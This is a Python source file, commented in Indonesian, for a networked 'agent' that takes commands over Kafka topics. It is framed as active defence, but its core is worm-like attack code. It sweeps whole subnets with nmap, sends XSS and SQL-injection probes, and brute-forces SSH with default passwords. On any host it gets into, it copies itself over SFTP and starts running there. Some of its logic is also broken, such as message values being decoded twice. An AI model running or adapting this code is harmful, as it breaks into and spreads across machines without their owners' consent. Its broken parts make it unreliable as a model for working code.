import paho.mqtt.client as mqtt
import json
import time
import uuid
import requests
import subprocess
import psutil
from datetime import datetime
import paramiko
import nmap
import socket
import threading
from urllib.parse import urlparse
from kafka import KafkaProducer, KafkaConsumer

# Konfigurasi agent
AGENT_ID = str(uuid.uuid4())
BROKER = "localhost:9092"
TOPIC_REPORTS = "throng_reports"
TOPIC_COMMANDS = f"throng_commands_{AGENT_ID}"
TOPIC_PEER = "throng_peer"
TOPIC_SCANS = "throng_scans"
TOPIC_EMERGENCY = "throng_emergency"

# Kafka producer
producer = KafkaProducer(bootstrap_servers=[BROKER], value_serializer=lambda v: json.dumps(v).encode('utf-8'))

# Callback untuk Kafka consumer
def on_message(consumer, action_map):
    for msg in consumer:
        command = json.loads(msg.value.decode('utf-8'))
        if command.get("agent_id") == AGENT_ID or msg.topic in [TOPIC_PEER, TOPIC_EMERGENCY]:
            action = command.get("action")
            target = command.get("target")
            params = command.get("params", {})
            emergency = command.get("emergency", False)
            
            print(f"Received command: {action} on {target} (Emergency: {emergency})")
            action_map.get(action, lambda x, y, z: None)(target, params, emergency)

# Fungsi pengambilan keputusan
def decide_action(report_data):
    traffic = report_data.get("network_traffic", 0)
    is_anomaly = report_data.get("is_anomaly", False)
    if is_anomaly or traffic > 50:
        return {"action": "scan_target", "target": "10.0.0.0/16", "emergency": True}
    elif traffic > 20:
        return {"action": "scan_target", "target": "192.168.1.0/24", "emergency": False}
    return None

# Fungsi respons aktif
def block_ip(target, params, emergency=False):
    try:
        subprocess.run(["iptables", "-A", "INPUT", "-s", target, "-j", "DROP"], check=True)
        print(f"Blocked IP {target}")
        log_action("block_ip", target, emergency)
        if emergency:
            producer.send(TOPIC_EMERGENCY, {"agent_id": AGENT_ID, "action": "block_ip", "target": target})
    except Exception as e:
        print(f"Error in block_ip: {e}")

def send_honeypot(target, params, emergency=False):
    try:
        fake_data = {
            "log": "Critical intrusion detected" if emergency else "Unauthorized access",
            "timestamp": datetime.now().isoformat(),
            "agent_id": AGENT_ID
        }
        requests.post(f"http://{target}/log", json=fake_data, timeout=2)
        print(f"Sent honeypot to {target}")
        log_action("send_honeypot", target, emergency)
    except Exception as e:
        print(f"Error in send_honeypot: {e}")

def redirect_traffic(target, params, emergency=False):
    try:
        print(f"Redirected traffic from {target}")
        log_action("redirect_traffic", target, emergency)
    except Exception as e:
        print(f"Error in redirect_traffic: {e}")

def replicate(host, params, emergency=False):
    try:
        credentials = params.get("credentials", {"username": "admin", "password": "admin"})
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=credentials["username"], password=credentials["password"])
        sftp = ssh.open_sftp()
        sftp.put("agent.py", "/tmp/agent.py")
        ssh.exec_command("python3 /tmp/agent.py &")
        sftp.close()
        ssh.close()
        print(f"Replicated to {host}")
        log_action("replicate", host, emergency)
    except Exception as e:
        print(f"Error in replicate: {e}")

def spawn_agent(host, params, emergency=False):
    try:
        credentials = params.get("credentials", {"username": "admin", "password": "admin"})
        new_agent_id = str(uuid.uuid4())
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=credentials["username"], password=credentials["password"])
        sftp = ssh.open_sftp()
        sftp.put("agent.py", f"/tmp/agent_{new_agent_id}.py")
        ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
        sftp.close()
        ssh.close()
        print(f"Spawned agent {new_agent_id} on {host}")
        log_action("spawn_agent", host, emergency)
    except Exception as e:
        print(f"Error in spawn_agent: {e}")

def scan_target(target, params, emergency=False):
    try:
        nm = nmap.PortScanner()
        args = "-sS -p 80,443,22" if not emergency else "-sV --script vuln -p 1-1000"
        nm.scan(target, arguments=args)
        scan_data = nm[target].all_protocols()
        vulnerabilities = []

        try:
            response = requests.get(f"http://{target}", timeout=3)
            server = response.headers.get("Server", "")
            if "Apache/2.2" in server or "nginx/1.14" in server:
                vulnerabilities.append(f"Outdated server: {server}")
            if response.status_code >= 500:
                vulnerabilities.append("Server error detected")
            if emergency:
                parsed = urlparse(f"http://{target}")
                test_url = f"{parsed.scheme}://{parsed.netloc}/test?input=<script>alert(1)</script>"
                try:
                    xss_response = requests.get(test_url, timeout=3)
                    if "<script>alert(1)</script>" in xss_response.text:
                        vulnerabilities.append("Potential XSS vulnerability")
                except:
                    pass
                test_url = f"{parsed.scheme}://{parsed.netloc}/login?username=admin'--"
                try:
                    sql_response = requests.get(test_url, timeout=3)
                    if "error" not in sql_response.text.lower():
                        vulnerabilities.append("Potential SQL injection")
                except:
                    pass
        except:
            vulnerabilities.append("No HTTP response")

        report = {
            "agent_id": AGENT_ID,
            "data": {
                "target": target,
                "vulnerability": vulnerabilities,
                "scan_data": scan_data,
                "ip": socket.gethostbyname(socket.gethostname())
            }
        }
        producer.send(TOPIC_SCANS, report)
        print(f"Scan results for {target}: {vulnerabilities}")
        log_action("scan_target", target, emergency)
        if emergency:
            producer.send(TOPIC_EMERGENCY, {"agent_id": AGENT_ID, "action": "scan_target", "target": target, "vulnerabilities": vulnerabilities})
    except Exception as e:
        print(f"Error in scan_target: {e}")

def exploit_target(target, params, emergency=False):
    try:
        credentials_list = params.get("credentials_list", [
            {"username": "admin", "password": "admin"},
            {"username": "root", "password": "root"},
            {"username": "user", "password": "password"}
        ])
        vulnerabilities = []
        for creds in credentials_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=creds["username"], password=creds["password"], timeout=3)
                ssh.close()
                vulnerabilities.append(f"Weak SSH credentials: {creds['username']}:{creds['password']}")
                spawn_agent(target, {"credentials": creds}, emergency)
                print(f"Exploited and claimed {target}")
                log_action("exploit_target", target, emergency)
                if emergency:
                    producer.send(TOPIC_EMERGENCY, {"agent_id": AGENT_ID, "action": "exploit_target", "target": target, "status": "claimed"})
                return
            except:
                continue
        vulnerabilities.append("No weak SSH credentials found")
        if emergency:
            try:
                response = requests.get(f"http://{target}/login?username=admin'--", timeout=3)
                if "error" not in response.text.lower():
                    vulnerabilities.append("Potential SQL injection vulnerability")
            except:
                pass
        report = {
            "agent_id": AGENT_ID,
            "data": {
                "target": target,
                "vulnerability": vulnerabilities,
                "ip": socket.gethostbyname(socket.gethostname())
            }
        }
        producer.send(TOPIC_SCANS, report)
        log_action("exploit_target", target, emergency, f"Vulnerabilities: {vulnerabilities}")
    except Exception as e:
        print(f"Error in exploit_target: {e}")

def proactive_scan():
    while True:
        try:
            nm = nmap.PortScanner()
            nm.scan("10.0.0.0/16", arguments="-sS -p 80,443,22 --open")
            for host in nm.all_hosts():
                scan_data = nm[host].all_protocols()
                vulnerabilities = []
                try:
                    response = requests.get(f"http://{host}", timeout=3)
                    server = response.headers.get("Server", "")
                    if "Apache/2.2" in server or "nginx/1.14" in server:
                        vulnerabilities.append(f"Outdated server: {server}")
                except:
                    vulnerabilities.append("No HTTP response")
                report = {
                    "agent_id": AGENT_ID,
                    "data": {
                        "target": host,
                        "vulnerability": vulnerabilities,
                        "scan_data": scan_data,
                        "ip": socket.gethostbyname(socket.gethostname())
                    }
                }
                producer.send(TOPIC_SCANS, report)
                print(f"Proactive scan found host: {host}")
                log_action("proactive_scan", host)
        except Exception as e:
            print(f"Error in proactive_scan: {e}")
        time.sleep(1800)  # Scan setiap 30 menit

def collect_data(emergency=False):
    try:
        net_stats = psutil.net_connections()
        suspicious_count = len([conn for conn in net_stats if conn.status == "ESTABLISHED"])
        threat_detected = suspicious_count > (10 if emergency else 50)
        data = {
            "timestamp": datetime.now().isoformat(),
            "network_traffic": suspicious_count,
            "suspicious_activity": threat_detected,
            "ip": socket.gethostbyname(socket.gethostname())
        }
        if threat_detected:
            producer.send(TOPIC_PEER, data)
            action = decide_action(data)
            if action:
                action_map.get(action["action"], lambda x, y, z: None)(action["target"], {}, action["emergency"])
        return data
    except Exception as e:
        print(f"Error collecting data: {e}")
        return {}

def log_action(action, target, emergency=False, details=""):
    with open("agent_log.txt", "a") as f:
        f.write(f"{datetime.now().isoformat()} | Action: {action} | Target: {target} | Emergency: {emergency} | Details: {details}\n")

# Peta aksi
action_map = {
    "block_ip": block_ip,
    "send_honeypot": send_honeypot,
    "redirect_traffic": redirect_traffic,
    "spawn_agent": spawn_agent,
    "replicate": replicate,
    "scan_target": scan_target,
    "exploit_target": exploit_target
}

# Inisialisasi Kafka consumer
consumer = KafkaConsumer(TOPIC_COMMANDS, TOPIC_PEER, TOPIC_EMERGENCY, bootstrap_servers=[BROKER], value_deserializer=lambda x: json.loads(x.decode('utf-8')))

# Mulai pemindaian proaktif
threading.Thread(target=proactive_scan, daemon=True).start()
threading.Thread(target=on_message, args=(consumer, action_map), daemon=True).start()

# Loop untuk laporan
while True:
    report = {
        "agent_id": AGENT_ID,
        "data": collect_data()
    }
    producer.send(TOPIC_REPORTS, report)
    print(f"Agent {AGENT_ID} sent report: {report}")
    time.sleep(60)